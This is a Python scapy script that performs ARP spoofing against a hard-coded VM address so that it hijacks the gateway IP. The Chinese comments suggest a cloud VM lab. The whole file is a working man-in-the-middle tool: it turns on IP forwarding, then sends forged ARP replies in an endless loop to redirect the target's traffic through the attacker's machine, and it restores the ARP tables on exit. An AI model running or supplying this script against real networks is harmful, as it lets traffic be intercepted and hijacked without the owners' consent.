#!/usr/bin/env python

import scapy.all as scapy
import time
import sys
import os

def enable_ip_forwarding():
    """Enables IP forwarding on the system."""
    print("[*] Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    """Disables IP forwarding on the system."""
    print("[*] Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def get_mac(ip):
    """
    Gets the MAC address of a given IP.
    """
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # Use srp1 for a single response
    answered = scapy.srp1(arp_request_broadcast, timeout=2, verbose=False)
    
    if answered:
        return answered.hwsrc
    else:
        print(f"[-] Could not get MAC address for {ip}. Retrying...")
        return None

def spoof(target_ip, spoof_ip, target_mac):
    """
    Sends a spoofed ARP response to the target.
    This function now sends a L2 frame directly.
    """
    # op=2 means ARP response. We tell target_ip that spoof_ip is at our MAC address.
    # We get our MAC address dynamically from the interface.
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # sendp sends packets at Layer 2. No more warnings!
    scapy.sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    """
    Restores the ARP table of the destination and source IPs.
    """
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    
    if not destination_mac or not source_mac:
        print("[-] Could not get MAC addresses for restoration. Manual restoration may be required.")
        return

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.sendp(packet, count=4, verbose=False)

# --- Script Execution ---
if __name__ == "__main__":
    target_vm_ip = "192.168.0.182"  # vm2 (ecs-e16b-7aa1) 的 IP
    ip_to_spoof = "192.168.0.254"   # 你想要劫持的 IP

    try:
        # Get target MAC once at the beginning
        print(f"[*] Obtaining MAC for target {target_vm_ip}...")
        target_vm_mac = get_mac(target_vm_ip)
        while not target_vm_mac:
            time.sleep(2)
            target_vm_mac = get_mac(target_vm_ip)
        print(f"[+] Target MAC found: {target_vm_mac}")

        enable_ip_forwarding()
        sent_packets_count = 0
        while True:
            spoof(target_vm_ip, ip_to_spoof, target_vm_mac)
            sent_packets_count += 1
            print(f"\r[*] Spoofing packets sent: {sent_packets_count}", end="")
            time.sleep(2) # 发送ARP包的间隔
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C ... Resetting ARP tables, please wait.")
        disable_ip_forwarding()
        restore(target_vm_ip, ip_to_spoof)
        print("[+] ARP tables restored. Quitting.")
    except Exception as e:
        print(f"\n[-] An error occurred: {e}")
        print("[-] Disabling IP forwarding.")
        disable_ip_forwarding()